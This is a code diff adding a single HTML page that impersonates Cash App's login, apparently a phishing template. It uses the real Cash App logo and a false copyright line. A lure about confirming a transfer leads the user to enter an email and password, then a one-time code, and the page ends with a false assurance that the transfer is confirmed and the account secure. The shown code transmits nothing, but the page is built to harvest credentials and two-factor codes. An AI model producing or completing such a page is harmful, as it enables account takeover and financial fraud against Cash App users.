@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cash App - Login</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 100px;
+    }
+    h2 {
+      text-align: center;
+      color: #0077cc;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 15px 0 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 5px 0 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #005fa3;
+    }
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://cashapp.com/static/branding/cash-app-logo.svg" alt="Cash App Logo" />
+    </div>
+    <h2>Cash App Login</h2>
+    <p>Verify your identity to confirm your Cash App transfer.</p>
+    <form id="loginForm" action="javascript:void(0);" onsubmit="nextPage('otp')">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" placeholder="your.email@example.com" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required />
+
+      <button type="submit">Next: Enter OTP</button>
+    </form>
+    <div class="footer">&copy; 2025 Cash App. All rights reserved.</div>
+  </div>
+
+  <!-- OTP Section -->
+  <div id="otpSection" style="display:none;">
+    <div class="logo">
+      <img src="https://cashapp.com/static/branding/cash-app-logo.svg" alt="Cash App Logo" />
+    </div>
+    <h2>One-Time Password (OTP)</h2>
+    <p>Please enter the One-Time Password (OTP) sent to your email.</p>
+    <form id="otpForm" action="javascript:void(0);" onsubmit="nextPage('confirm')">
+      <input type="hidden" name="email" id="otpEmail" value="" />
+      <input type="hidden" name="password" id="otpPassword" value="" />
+
+      <label for="otp">One-Time Password (OTP)</label>
+      <input type="text" id="otp" name="otp" placeholder="Enter OTP" required />
+
+      <button type="submit">Verify & Confirm</button>
+    </form>
+    <div class="footer">&copy; 2025 Cash App. All rights reserved.</div>
+  </div>
+
+  <!-- Confirmation Section -->
+  <div id="confirmSection" style="display:none;">
+    <div class="logo">
+      <img src="https://cashapp.com/static/branding/cash-app-logo.svg" alt="Cash App Logo" />
+    </div>
+    <h2>Transfer Confirmed</h2>
+    <p>Your transfer has been successfully confirmed. Your account is now secure.</p>
+    <div class="footer">&copy; 2025 Cash App. All rights reserved.</div>
+  </div>
+</body>
+
+<script>
+  function nextPage(target) {
+    const login = document.getElementById('loginForm');
+    const otp = document.getElementById('otpForm');
+    const confirm = document.getElementById('confirmSection');
+
+    if (target === 'otp') {
+      login.style.display = 'none';
+      document.getElementById('otpSection').style.display = 'block';
+      document.getElementById('otpEmail').value = login.email.value;
+      document.getElementById('otpPassword').value = login.password.value;
+    } else if (target === 'confirm') {
+      otp.style.display = 'none';
+      confirm.style.display = 'block';
+    }
+  }
+</script>
+</html>
